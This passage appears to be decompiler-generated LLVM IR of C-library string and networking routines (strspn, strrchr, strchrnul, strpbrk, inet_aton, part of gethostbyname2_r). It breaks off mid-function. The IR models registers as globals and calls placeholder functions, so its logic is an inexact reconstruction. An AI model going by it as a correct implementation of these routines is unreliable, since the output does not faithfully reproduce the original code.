define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1a6bc2 = load i32, i32* @r0, align 4
  %v1_1a6bc3 = inttoptr i32 %v0_1a6bc2 to i8*
  %v2_1a6bc4 = load i8, i8* %v1_1a6bc3, align 1
  %v3_1a6bc5 = zext i8 %v2_1a6bc4 to i32
  store i32 %v3_1a6bc5, i32* @ip, align 4
  %v2_1a6c06 = icmp eq i8 %v2_1a6bc4, 0
  br i1 %v2_1a6c06, label %dec_label_pc_1a6cc, label %dec_label_pc_1a6a0.preheader

dec_label_pc_1a698:                               ; preds = %dec_label_pc_1a6a0
  %v3_1a6a0 = zext i8 %v2_1a6a0 to i32
  %v1_1a6a8 = add i32 %v0_1a6a8, 1
  %v9_1a698 = icmp eq i32 %v0_1a69810, %v3_1a6a0
  br i1 %v9_1a698, label %dec_label_pc_1a6b4, label %dec_label_pc_1a6a0

dec_label_pc_1a6a0:                               ; preds = %dec_label_pc_1a6a0.preheader, %dec_label_pc_1a698
  %v0_1a6a8 = phi i32 [ %tmp, %dec_label_pc_1a6a0.preheader ], [ %v1_1a6a8, %dec_label_pc_1a698 ]
  %v1_1a6a0 = inttoptr i32 %v0_1a6a8 to i8*
  %v2_1a6a0 = load i8, i8* %v1_1a6a0, align 1
  %v2_1a6a4 = icmp eq i8 %v2_1a6a0, 0
  br i1 %v2_1a6a4, label %dec_label_pc_1a6cc, label %dec_label_pc_1a698

dec_label_pc_1a6b4:                               ; preds = %dec_label_pc_1a698
  %v1_1a6b4 = add i32 %v0_1a6b4, 1
  %v1_1a6b8 = add i32 %v0_1a6b8, 1
  %v1_1a6bc = inttoptr i32 %v1_1a6b8 to i8*
  %v2_1a6bc = load i8, i8* %v1_1a6bc, align 1
  %v3_1a6bc = zext i8 %v2_1a6bc to i32
  store i32 %v3_1a6bc, i32* @ip, align 4
  %v2_1a6c0 = icmp eq i8 %v2_1a6bc, 0
  br i1 %v2_1a6c0, label %dec_label_pc_1a6cc, label %dec_label_pc_1a6a0.preheader

dec_label_pc_1a6a0.preheader:                     ; preds = %entry, %dec_label_pc_1a6b4
  %v0_1a6b8 = phi i32 [ %v1_1a6b8, %dec_label_pc_1a6b4 ], [ %v0_1a6bc2, %entry ]
  %v0_1a6b4 = phi i32 [ %v1_1a6b4, %dec_label_pc_1a6b4 ], [ 0, %entry ]
  %v0_1a69810 = phi i32 [ %v3_1a6bc, %dec_label_pc_1a6b4 ], [ %v3_1a6bc5, %entry ]
  br label %dec_label_pc_1a6a0

dec_label_pc_1a6cc:                               ; preds = %dec_label_pc_1a6b4, %dec_label_pc_1a6a0, %entry
  %v0_1a6cc = phi i32 [ 0, %entry ], [ %v0_1a6b4, %dec_label_pc_1a6a0 ], [ %v1_1a6b4, %dec_label_pc_1a6b4 ]
  ret i32 %v0_1a6cc

; uselistorder directives
  uselistorder i32 %v0_1a6a8, { 1, 0 }
  uselistorder label %dec_label_pc_1a6a0.preheader, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1a6dc = urem i32 %arg2, 256
  store i32 %v1_1a6dc, i32* @r4, align 4
  %v2_1a6dc = icmp eq i32 %v1_1a6dc, 0
  br i1 %v2_1a6dc, label %dec_label_pc_1a6f0, label %dec_label_pc_1a704.preheader

dec_label_pc_1a704.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1a70c3 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_1a6dc)
  %v2_1a7105 = icmp eq i32 %v2_1a70c3, 0
  br i1 %v2_1a7105, label %dec_label_pc_1a718, label %dec_label_pc_1a6fc

dec_label_pc_1a6f0:                               ; preds = %entry
  %v2_1a6f4 = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_1a71c

dec_label_pc_1a6fc:                               ; preds = %dec_label_pc_1a704.preheader, %dec_label_pc_1a6fc
  %v2_1a70c6 = phi i32 [ %v2_1a70c, %dec_label_pc_1a6fc ], [ %v2_1a70c3, %dec_label_pc_1a704.preheader ]
  store i32 %v2_1a70c6, i32* @r5, align 4
  %v1_1a700 = add i32 %v2_1a70c6, 1
  store i32 %v1_1a700, i32* @r0, align 4
  %v0_1a708 = load i32, i32* @r4, align 4
  %v2_1a70c = call i32 @__GI_strchr(i32 %v1_1a700, i32 %v0_1a708)
  %v2_1a710 = icmp eq i32 %v2_1a70c, 0
  br i1 %v2_1a710, label %dec_label_pc_1a718, label %dec_label_pc_1a6fc

dec_label_pc_1a718:                               ; preds = %dec_label_pc_1a6fc, %dec_label_pc_1a704.preheader
  %v0_1a718 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a71c

dec_label_pc_1a71c:                               ; preds = %dec_label_pc_1a6f0, %dec_label_pc_1a718
  %storemerge = phi i32 [ %v2_1a6f4, %dec_label_pc_1a6f0 ], [ %v0_1a718, %dec_label_pc_1a718 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_1a70c, { 1, 0 }
  uselistorder i32 %v1_1a700, { 1, 0 }
  uselistorder i32 %v1_1a6dc, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1a71c, { 1, 0 }
  uselistorder label %dec_label_pc_1a6fc, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_1a728 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_1a738 = call i32 @memcpy()
  %v0_1a73c = load i32, i32* @r5, align 4
  %v1_1a73c = load i32, i32* @r4, align 4
  %v2_1a73c = add i32 %v1_1a73c, %v0_1a73c
  store i32 %v6_1a728, i32* @r5, align 4
  ret i32 %v2_1a73c
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_1a750 = urem i32 %arg1, 256
  %v0_1a7702 = load i32, i32* @r0, align 4
  %v1_1a7703 = urem i32 %v0_1a7702, 4
  %v2_1a7704 = icmp eq i32 %v1_1a7703, 0
  br i1 %v2_1a7704, label %dec_label_pc_1a778, label %dec_label_pc_1a758

dec_label_pc_1a758:                               ; preds = %entry, %dec_label_pc_1a76c
  %v0_1a76c = phi i32 [ %v1_1a76c, %dec_label_pc_1a76c ], [ %v0_1a7702, %entry ]
  %v1_1a758 = inttoptr i32 %v0_1a76c to i8*
  %v2_1a758 = load i8, i8* %v1_1a758, align 1
  %v3_1a758 = zext i8 %v2_1a758 to i32
  %v9_1a75c = icmp eq i32 %v3_1a758, %v1_1a750
  br i1 %v9_1a75c, label %dec_label_pc_1a828, label %dec_label_pc_1a764

dec_label_pc_1a764:                               ; preds = %dec_label_pc_1a758
  %v2_1a764 = icmp eq i8 %v2_1a758, 0
  br i1 %v2_1a764, label %dec_label_pc_1a828, label %dec_label_pc_1a76c

dec_label_pc_1a76c:                               ; preds = %dec_label_pc_1a764
  %v1_1a76c = add i32 %v0_1a76c, 1
  %v1_1a770 = urem i32 %v1_1a76c, 4
  %v2_1a770 = icmp eq i32 %v1_1a770, 0
  br i1 %v2_1a770, label %dec_label_pc_1a778, label %dec_label_pc_1a758

dec_label_pc_1a778:                               ; preds = %dec_label_pc_1a76c, %entry
  %v0_1a77c = phi i32 [ %v0_1a7702, %entry ], [ %v1_1a76c, %dec_label_pc_1a76c ]
  %v4_1a778 = mul nuw nsw i32 %v1_1a750, 256
  %v5_1a778 = or i32 %v4_1a778, %v1_1a750
  %v4_1a780 = mul i32 %v5_1a778, 65536
  %v5_1a780 = or i32 %v4_1a780, %v5_1a778
  br label %dec_label_pc_1a784

dec_label_pc_1a784:                               ; preds = %dec_label_pc_1a820, %dec_label_pc_1a7c0, %dec_label_pc_1a778
  %v0_1a7e8 = phi i32 [ %v0_1a77c, %dec_label_pc_1a778 ], [ %v4_1a784, %dec_label_pc_1a7c0 ], [ %v4_1a784, %dec_label_pc_1a820 ]
  %v1_1a784 = inttoptr i32 %v0_1a7e8 to i32*
  %v2_1a784 = load i32, i32* %v1_1a784, align 4
  %v4_1a784 = add i32 %v0_1a7e8, 4
  %v2_1a78c = xor i32 %v2_1a784, %v5_1a780
  %v2_1a790 = add i32 %v2_1a78c, 2130640639
  store i32 %v2_1a790, i32* @ip, align 4
  %v2_1a798 = add i32 %v2_1a784, 2130640639
  %v1_1a79c = sub i32 -1, %v2_1a784
  %v2_1a7a0 = xor i32 %v2_1a798, %v1_1a79c
  %v2_1a7ac = and i32 %v2_1a7a0, -2130640640
  %v2_1a7b4 = icmp eq i32 %v2_1a7ac, 0
  br i1 %v2_1a7b4, label %dec_label_pc_1a7c0, label %dec_label_pc_1a7c8

dec_label_pc_1a7c0:                               ; preds = %dec_label_pc_1a784
  %v1_1a7a8 = sub i32 -1, %v2_1a78c
  %v2_1a7b0 = xor i32 %v2_1a790, %v1_1a7a8
  %v2_1a7b8 = and i32 %v2_1a7b0, -2130640640
  %v2_1a7c0 = icmp eq i32 %v2_1a7b8, 0
  br i1 %v2_1a7c0, label %dec_label_pc_1a784, label %dec_label_pc_1a7c8

dec_label_pc_1a7c8:                               ; preds = %dec_label_pc_1a784, %dec_label_pc_1a7c0
  %v2_1a7c8 = inttoptr i32 %v0_1a7e8 to i8*
  %v3_1a7c8 = load i8, i8* %v2_1a7c8, align 1
  %v4_1a7c8 = zext i8 %v3_1a7c8 to i32
  %v9_1a7cc = icmp eq i32 %v4_1a7c8, %v1_1a750
  br i1 %v9_1a7cc, label %dec_label_pc_1a828, label %dec_label_pc_1a7d8

dec_label_pc_1a7d8:                               ; preds = %dec_label_pc_1a7c8
  %v2_1a7d8 = icmp eq i8 %v3_1a7c8, 0
  br i1 %v2_1a7d8, label %dec_label_pc_1a828, label %dec_label_pc_1a7e0

dec_label_pc_1a7e0:                               ; preds = %dec_label_pc_1a7d8
  %v1_1a7e0 = add i32 %v0_1a7e8, 1
  %v2_1a7e0 = inttoptr i32 %v1_1a7e0 to i8*
  %v3_1a7e0 = load i8, i8* %v2_1a7e0, align 1
  %v4_1a7e0 = zext i8 %v3_1a7e0 to i32
  %v9_1a7e4 = icmp eq i32 %v4_1a7e0, %v1_1a750
  br i1 %v9_1a7e4, label %dec_label_pc_1a828, label %dec_label_pc_1a7f0

dec_label_pc_1a7f0:                               ; preds = %dec_label_pc_1a7e0
  %v2_1a7f0 = icmp eq i8 %v3_1a7e0, 0
  br i1 %v2_1a7f0, label %dec_label_pc_1a828, label %dec_label_pc_1a7f8

dec_label_pc_1a7f8:                               ; preds = %dec_label_pc_1a7f0
  %v1_1a7f8 = add i32 %v0_1a7e8, 2
  %v2_1a7f8 = inttoptr i32 %v1_1a7f8 to i8*
  %v3_1a7f8 = load i8, i8* %v2_1a7f8, align 1
  %v4_1a7f8 = zext i8 %v3_1a7f8 to i32
  %v9_1a7fc = icmp eq i32 %v4_1a7f8, %v1_1a750
  br i1 %v9_1a7fc, label %dec_label_pc_1a828, label %dec_label_pc_1a808

dec_label_pc_1a808:                               ; preds = %dec_label_pc_1a7f8
  %v2_1a808 = icmp eq i8 %v3_1a7f8, 0
  br i1 %v2_1a808, label %dec_label_pc_1a828, label %dec_label_pc_1a810

dec_label_pc_1a810:                               ; preds = %dec_label_pc_1a808
  %v1_1a810 = add i32 %v0_1a7e8, 3
  %v2_1a810 = inttoptr i32 %v1_1a810 to i8*
  %v3_1a810 = load i8, i8* %v2_1a810, align 1
  %v4_1a810 = zext i8 %v3_1a810 to i32
  %v9_1a814 = icmp eq i32 %v4_1a810, %v1_1a750
  br i1 %v9_1a814, label %dec_label_pc_1a828, label %dec_label_pc_1a820

dec_label_pc_1a820:                               ; preds = %dec_label_pc_1a810
  %v2_1a820 = icmp eq i8 %v3_1a810, 0
  br i1 %v2_1a820, label %dec_label_pc_1a828, label %dec_label_pc_1a784

dec_label_pc_1a828:                               ; preds = %dec_label_pc_1a764, %dec_label_pc_1a758, %dec_label_pc_1a820, %dec_label_pc_1a810, %dec_label_pc_1a808, %dec_label_pc_1a7f8, %dec_label_pc_1a7f0, %dec_label_pc_1a7e0, %dec_label_pc_1a7d8, %dec_label_pc_1a7c8
  %v1_1a82c = phi i32 [ %v1_1a810, %dec_label_pc_1a820 ], [ %v1_1a810, %dec_label_pc_1a810 ], [ %v1_1a7f8, %dec_label_pc_1a808 ], [ %v1_1a7f8, %dec_label_pc_1a7f8 ], [ %v1_1a7e0, %dec_label_pc_1a7f0 ], [ %v1_1a7e0, %dec_label_pc_1a7e0 ], [ %v0_1a7e8, %dec_label_pc_1a7d8 ], [ %v0_1a7e8, %dec_label_pc_1a7c8 ], [ %v0_1a76c, %dec_label_pc_1a758 ], [ %v0_1a76c, %dec_label_pc_1a764 ]
  ret i32 %v1_1a82c

; uselistorder directives
  uselistorder i32 %v4_1a784, { 1, 0 }
  uselistorder i32 %v2_1a784, { 0, 2, 1 }
  uselistorder i32 %v0_1a7e8, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1a778, { 1, 0 }
  uselistorder i32 %v1_1a76c, { 1, 0, 2 }
  uselistorder i32 %v0_1a7702, { 2, 1, 0 }
  uselistorder i32 %v1_1a750, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 0, 1, 2, 6, 3, 4, 5 }
  uselistorder i32 2130640639, { 2, 6, 7, 3, 0, 8, 9, 4, 1, 5, 10 }
  uselistorder label %dec_label_pc_1a828, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_1a7c8, { 1, 0 }
  uselistorder label %dec_label_pc_1a758, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a864

dec_label_pc_1a840:                               ; preds = %dec_label_pc_1a850
  %v3_1a850 = zext i8 %v2_1a850 to i32
  %v1_1a858 = add i32 %v0_1a858, 1
  %v1_1a840 = load i32, i32* %r0.global-to-local, align 4
  %v9_1a840 = icmp eq i32 %v3_1a850, %v1_1a840
  br i1 %v9_1a840, label %dec_label_pc_1a848, label %dec_label_pc_1a850

dec_label_pc_1a848:                               ; preds = %dec_label_pc_1a840
  %v0_1a848 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1a848, i32* %r0.global-to-local, align 4
  ret i32 %v0_1a848

dec_label_pc_1a850:                               ; preds = %dec_label_pc_1a840, %dec_label_pc_1a864
  %v0_1a858 = phi i32 [ %v1_1a858, %dec_label_pc_1a840 ], [ %arg2, %dec_label_pc_1a864 ]
  %v1_1a850 = inttoptr i32 %v0_1a858 to i8*
  %v2_1a850 = load i8, i8* %v1_1a850, align 1
  %v2_1a854 = icmp eq i8 %v2_1a850, 0
  br i1 %v2_1a854, label %dec_label_pc_1a860, label %dec_label_pc_1a840

dec_label_pc_1a860:                               ; preds = %dec_label_pc_1a850
  %v0_1a860 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a860 = add i32 %v0_1a860, 1
  br label %dec_label_pc_1a864

dec_label_pc_1a864:                               ; preds = %entry, %dec_label_pc_1a860
  %storemerge = phi i32 [ %tmp, %entry ], [ %v1_1a860, %dec_label_pc_1a860 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_1a864 = inttoptr i32 %storemerge to i8*
  %v2_1a864 = load i8, i8* %v1_1a864, align 1
  %v3_1a864 = zext i8 %v2_1a864 to i32
  store i32 %v3_1a864, i32* %r0.global-to-local, align 4
  %v2_1a868 = icmp eq i8 %v2_1a864, 0
  %v0_1a86c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1a868, i32 %v0_1a86c)
  br label %dec_label_pc_1a850

; uselistorder directives
  uselistorder i32 %v0_1a858, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1a864, { 1, 0 }
  uselistorder label %dec_label_pc_1a850, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1a878 = load i32, i32* @r4, align 4
  store i32 %v3_1a878, i32* %stack_var_-28, align 4
  %v0_1a880 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a880 = icmp eq i32 %v0_1a880, 0
  br i1 %v2_1a880, label %dec_label_pc_1a95c, label %dec_label_pc_1a890

dec_label_pc_1a890:                               ; preds = %entry
  br label %dec_label_pc_1a8a8

dec_label_pc_1a8a8:                               ; preds = %dec_label_pc_1a890, %dec_label_pc_1a920
  %v1_1a920 = phi i32 [ 0, %dec_label_pc_1a890 ], [ %v5_1a920, %dec_label_pc_1a920 ]
  %v0_1a924 = phi i32 [ 1, %dec_label_pc_1a890 ], [ %v1_1a924, %dec_label_pc_1a920 ]
  %v0_1a8a8 = phi i32 [ %v0_1a880, %dec_label_pc_1a890 ], [ %v0_1a8a812, %dec_label_pc_1a920 ]
  %v1_1a8a8 = inttoptr i32 %v0_1a8a8 to i8*
  %v2_1a8a8 = load i8, i8* %v1_1a8a8, align 1
  %v3_1a8a8 = zext i8 %v2_1a8a8 to i32
  %v4_1a8ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 684) to i32*), align 4
  %v2_1a8b0 = mul nuw nsw i32 %v3_1a8a8, 2
  %v2_1a8b4 = add i32 %v2_1a8b0, %v4_1a8ac
  %v3_1a8b4 = inttoptr i32 %v2_1a8b4 to i16*
  %v4_1a8b4 = load i16, i16* %v3_1a8b4, align 2
  %v1_1a8b8 = and i16 %v4_1a8b4, 8
  %v2_1a8b8 = icmp eq i16 %v1_1a8b8, 0
  br i1 %v2_1a8b8, label %dec_label_pc_1a95c, label %dec_label_pc_1a8c0

dec_label_pc_1a8c0:                               ; preds = %dec_label_pc_1a8a8
  br label %dec_label_pc_1a8e0

dec_label_pc_1a8c8:                               ; preds = %dec_label_pc_1a8e0
  %v2_1a8c8 = mul i32 %v0_1a920, 10
  %v1_1a8cc = add i32 %v2_1a8c8, -48
  %v2_1a8d0 = add i32 %v3_1a8e0, %v1_1a8cc
  %v8_1a8d8 = icmp sgt i32 %v2_1a8d0, 255
  br i1 %v8_1a8d8, label %dec_label_pc_1a95c, label %dec_label_pc_1a8dc

dec_label_pc_1a8dc:                               ; preds = %dec_label_pc_1a8c8
  %v1_1a8dc = add i32 %v0_1a910, 1
  store i32 %v1_1a8dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a8e0

dec_label_pc_1a8e0:                               ; preds = %dec_label_pc_1a8c0, %dec_label_pc_1a8dc
  %v0_1a920 = phi i32 [ 0, %dec_label_pc_1a8c0 ], [ %v2_1a8d0, %dec_label_pc_1a8dc ]
  %v0_1a910 = phi i32 [ %v0_1a8a8, %dec_label_pc_1a8c0 ], [ %v1_1a8dc, %dec_label_pc_1a8dc ]
  %v1_1a8e0 = inttoptr i32 %v0_1a910 to i8*
  %v2_1a8e0 = load i8, i8* %v1_1a8e0, align 1
  %v3_1a8e0 = zext i8 %v2_1a8e0 to i32
  %v2_1a8e4 = mul nuw nsw i32 %v3_1a8e0, 2
  %v2_1a8e8 = add i32 %v2_1a8e4, %v4_1a8ac
  %v3_1a8e8 = inttoptr i32 %v2_1a8e8 to i16*
  %v4_1a8e8 = load i16, i16* %v3_1a8e8, align 2
  %v6_1a8e8 = zext i16 %v4_1a8e8 to i32
  %v1_1a8ec = and i32 %v6_1a8e8, 8
  %v2_1a8ec = icmp eq i32 %v1_1a8ec, 0
  br i1 %v2_1a8ec, label %dec_label_pc_1a8f4, label %dec_label_pc_1a8c8

dec_label_pc_1a8f4:                               ; preds = %dec_label_pc_1a8e0
  %v7_1a8f4 = icmp eq i32 %v0_1a924, 4
  br i1 %v7_1a8f4, label %dec_label_pc_1a90c, label %dec_label_pc_1a8fc

dec_label_pc_1a8fc:                               ; preds = %dec_label_pc_1a8f4
  %v7_1a8fc = icmp eq i8 %v2_1a8e0, 46
  br i1 %v7_1a8fc, label %dec_label_pc_1a904, label %dec_label_pc_1a95c

dec_label_pc_1a904:                               ; preds = %dec_label_pc_1a8fc
  %v1_1a904 = add i32 %v0_1a910, 1
  store i32 %v1_1a904, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a920

dec_label_pc_1a90c:                               ; preds = %dec_label_pc_1a8f4
  %v2_1a90c = icmp eq i8 %v2_1a8e0, 0
  %v1_1a910 = add i32 %v0_1a910, 1
  store i32 %v1_1a910, i32* %r0.global-to-local, align 4
  br i1 %v2_1a90c, label %dec_label_pc_1a920, label %dec_label_pc_1a918

dec_label_pc_1a918:                               ; preds = %dec_label_pc_1a90c
  %v1_1a918 = and i32 %v6_1a8e8, 32
  %v2_1a918 = icmp eq i32 %v1_1a918, 0
  br i1 %v2_1a918, label %dec_label_pc_1a95c, label %dec_label_pc_1a920

dec_label_pc_1a920:                               ; preds = %dec_label_pc_1a918, %dec_label_pc_1a90c, %dec_label_pc_1a904
  %v0_1a8a812 = phi i32 [ %v1_1a910, %dec_label_pc_1a918 ], [ %v1_1a910, %dec_label_pc_1a90c ], [ %v1_1a904, %dec_label_pc_1a904 ]
  %v4_1a920 = mul i32 %v1_1a920, 256
  %v5_1a920 = or i32 %v0_1a920, %v4_1a920
  %v1_1a924 = add nuw nsw i32 %v0_1a924, 1
  %v7_1a92c = icmp slt i32 %v1_1a924, 5
  br i1 %v7_1a92c, label %dec_label_pc_1a8a8, label %dec_label_pc_1a930

dec_label_pc_1a930:                               ; preds = %dec_label_pc_1a920
  %v2_1a930 = icmp eq i32 %arg2, 0
  br i1 %v2_1a930, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_1a930
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a960

bb:                                               ; preds = %dec_label_pc_1a930
  %v4_1a934 = udiv i32 %v5_1a920, 16777216
  %v2_1a938 = udiv i32 %v5_1a920, 256
  %v5_1a93c = and i32 %v2_1a938, 65280
  %v2_1a940 = and i32 %v5_1a920, 65280
  %v5_1a944 = mul nuw nsw i32 %v2_1a940, 256
  %v5_1a948 = mul i32 %v0_1a920, 16777216
  %v6_1a93c = or i32 %v4_1a934, %v5_1a948
  %v6_1a944 = or i32 %v6_1a93c, %v5_1a93c
  %v6_1a948 = or i32 %v6_1a944, %v5_1a944
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_1a954 = inttoptr i32 %arg2 to i32*
  store i32 %v6_1a948, i32* %v3_1a954, align 4
  %v2_1a960.pre = load i32, i32* %stack_var_-28, align 4
  %v1_1a964.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a960

dec_label_pc_1a95c:                               ; preds = %dec_label_pc_1a8fc, %dec_label_pc_1a918, %dec_label_pc_1a8a8, %dec_label_pc_1a8c8, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a960

dec_label_pc_1a960:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_1a95c
  %v1_1a964 = phi i32 [ %v1_1a964.pre, %bb ], [ 0, %dec_label_pc_1a95c ], [ 1, %.thread7.thread ]
  %v2_1a960 = phi i32 [ %v2_1a960.pre, %bb ], [ %v3_1a878, %dec_label_pc_1a95c ], [ %v3_1a878, %.thread7.thread ]
  store i32 %v2_1a960, i32* @r4, align 4
  ret i32 %v1_1a964

; uselistorder directives
  uselistorder i32 %v1_1a924, { 1, 0 }
  uselistorder i32 %v5_1a920, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1a910, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 2, 6, 7, 8, 0, 1 }
  uselistorder i32 65280, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1a960, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a95c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1a8e0, { 1, 0 }
  uselistorder label %dec_label_pc_1a8a8, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v9_1a970 = load i32, i32* @r6, align 4
  %v12_1a970 = load i32, i32* @r7, align 4
  %v15_1a970 = load i32, i32* @r8, align 4
  %v18_1a970 = load i32, i32* @sb, align 4
  %v21_1a970 = load i32, i32* @sl, align 4
  %v7_1a974 = icmp eq i32 %arg2, 2
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %arg5, i32* @sl, align 4
  store i32 %arg7, i32* @fp, align 4
  br i1 %v7_1a974, label %dec_label_pc_1a998, label %dec_label_pc_1a9b8

dec_label_pc_1a998:                               ; preds = %entry
  store i32 %arg6, i32* @ip, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg4, i32* @r2, align 4
  store i32 %arg5, i32* @r3, align 4
  %v0_1a9b0 = call i32 @gethostbyname_r()
  store i32 %v0_1a9b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ac04

dec_label_pc_1a9b8:                               ; preds = %entry
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v7_1a9c0 = icmp eq i32 %arg2, 10
  %v2_1a9c4 = inttoptr i32 %arg6 to i32*
  store i32 0, i32* %v2_1a9c4, align 4
  br i1 %v7_1a9c0, label %dec_label_pc_1a9cc, label %dec_label_pc_1ac00

dec_label_pc_1a9cc:                               ; preds = %dec_label_pc_1a9b8
  %v1_1a9cc = load i32, i32* @r7, align 4
  %v9_1a9cc = icmp eq i32 %v1_1a9cc, %arg1
  br i1 %v9_1a9cc, label %dec_label_pc_1ac00, label %dec_label_pc_1a9d4

dec_label_pc_1a9d4:                               ; preds = %dec_label_pc_1a9cc
  %v0_1a9d4 = call i32 @__GI___errno_location()
  store i32 %v0_1a9d4, i32* %r0.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_1a9d4, i32* @r5, align 4
  %v0_1a9e0 = load i32, i32* @r4, align 4
  %v0_1a9e4 = load i32, i32* @r6, align 4
  store i32 %v0_1a9e4, i32* %r2.global-to-local, align 4
  %v1_1a9e8 = inttoptr i32 %v0_1a9d4 to i32*
  %v2_1a9e8 = load i32, i32* %v1_1a9e8, align 4
  store i32 %v2_1a9e8, i32* @r4, align 4
  %v0_1a9ec = load i32, i32* @r8, align 4
  store i32 %v0_1a9ec, i32* %r3.global-to-local, align 4
  %v0_1a9f0 = load i32, i32* @r7, align 4
  store i32 %v0_1a9f0, i32* %v1_1a9e8, align 4
  %v0_1a9f4 = load i32, i32* @sb, align 4
  store i32 %v0_1a9f4, i32* %r0.global-to-local, align 4
  %v2_1a9f8 = load i32, i32* @sl, align 4
  %v5_1a9f8 = load i32, i32* %ip.global-to-local, align 4
  %v0_1a9fc = load i32, i32* @fp, align 4
  %v7_1aa00 = call i32 @__get_hosts_byname_r(i32 %v0_1a9f4, i32 %v0_1a9e0, i32 %v0_1a9e4, i32 %v0_1a9ec, i32 %v2_1a9f8, i32 %v5_1a9f8, i32 %v0_1a9fc)
  store i32 %v7_1aa00, i32* %r0.global-to-local, align 4
  %v2_1aa04 = icmp eq i32 %v7_1aa00, 0
  br i1 %v2_1aa04, label %bb, label %dec_label_pc_1aa10

bb:                                               ; preds = %dec_label_pc_1a9d4
  %v1_1aa08 = load i32, i32* @r4, align 4
  %v2_1aa08 = load i32, i32* @r5, align 4
  %v3_1aa08 = inttoptr i32 %v2_1aa08 to i32*
  store i32 %v1_1aa08, i32* %v3_1aa08, align 4
  br label %dec_label_pc_1ac04

dec_label_pc_1aa10:                               ; preds = %dec_label_pc_1a9d4
  %v0_1aa10 = load i32, i32* @fp, align 4
  %v1_1aa10 = inttoptr i32 %v0_1aa10 to i32*
  %v2_1aa10 = load i32, i32* %v1_1aa10, align 4
  store i32 %v2_1aa10, i32* %r3.global-to-local, align 4
  %v7_1aa14 = icmp eq i32 %v2_1aa10, 1
  br i1 %v7_1aa14, label %dec_label_pc_1aa30, label %dec_label_pc_1aa1c

dec_label_pc_1aa1c:                               ; preds = %dec_label_pc_1aa10
  %v7_1aa1c = icmp eq i32 %v2_1aa10, 4
  br i1 %v7_1aa1c, label %dec_label_pc_1aa4c, label %dec_label_pc_1aa24

